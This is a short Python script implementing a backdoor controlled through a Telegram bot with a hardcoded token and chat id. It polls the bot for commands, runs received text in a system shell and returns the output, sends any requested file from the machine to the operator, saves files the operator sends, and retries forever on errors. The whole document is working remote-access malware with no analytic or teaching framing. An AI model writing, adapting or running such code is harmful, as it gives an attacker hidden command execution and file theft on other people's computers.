import requests
from subprocess import check_output
from os import chdir
from time import sleep

url = 'https://api.telegram.org/bot6114413485:AAHKBapgn6Mv7LtYQXi5bHsB3pLgc9zFyhA/'

def send_msg(text):
    if len(text) > 4095:
        for i in range(0, len(text), 4095):
            requests.get(url + 'SendMessage?chat_id=1222961630&text=' + text[i:i+4095])
    elif len(text) == 0:
        requests.get(url + 'SendMessage?chat_id=1222961630&text=ok')
    else:
        requests.get(url + 'SendMessage?chat_id=1222961630&text=' + text)


def send_doc(path):
    try:
        data = {'chat_id': 1222961630,}
        files = {'document': open(path, 'rb')}
        requests.get(url + 'SendDocument', data=data, files=files)
    except Exception as e:
        send_msg(str(e))


def get_last_msg():
    json = requests.get(url + 'getUpdates?offset=-1').json()
    try:
        res = [False, json['result'][0]['message']['date'], json['result'][0]['message']['text']]
    except KeyError:
        res = [True, json['result'][0]['message']['date'], json['result'][0]['message']['document']['file_id'], json['result'][0]['message']['document']['file_name']]
    return res


def upload_doc(file_id, file_name):
    try:
        TOKEN = '6114413485:AAHKBapgn6Mv7LtYQXi5bHsB3pLgc9zFyhA'
        url = f'https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}'
        response = requests.get(url).json()
        file_path = response['result']['file_path']
        file_url = f'https://api.telegram.org/file/bot{TOKEN}/{file_path}'
        response = requests.get(file_url)
        with open(file_name, 'wb') as f:
            f.write(response.content)
        
        send_msg('ok')

    except Exception as e:
        send_msg(str(e))


def what_to_do_with_text(text: str):
    text = text[1:]
    if text.startswith('start'):
        send_msg('/cmd ...\n/download ...\nsend file to upload it')

    elif text.startswith('cmd'):
        text = text[4:]
        if text.startswith('cd '):
            try:
                chdir(text[4:])
                send_msg('ok')
            except Exception as e:
                send_msg(str(e))
        else:
            try:
                send_msg(check_output(text, shell=True).decode('cp866'))
            except Exception as e:
                send_msg(str(e))
    elif text.startswith('download'):
        text = text[9:]
        send_doc(text)
    


def bot():
    date = None
    last_msg = None

    while True:
        last_msg = get_last_msg()
        if last_msg[1] != date:
            date = last_msg[1]

            if last_msg[0] == False:
                what_to_do_with_text(last_msg[2])
            else:
                upload_doc(last_msg[2], last_msg[3])
        sleep(2)


if __name__ == '__main__':
    while True:
        try:
            bot()
        except:
            sleep(3)
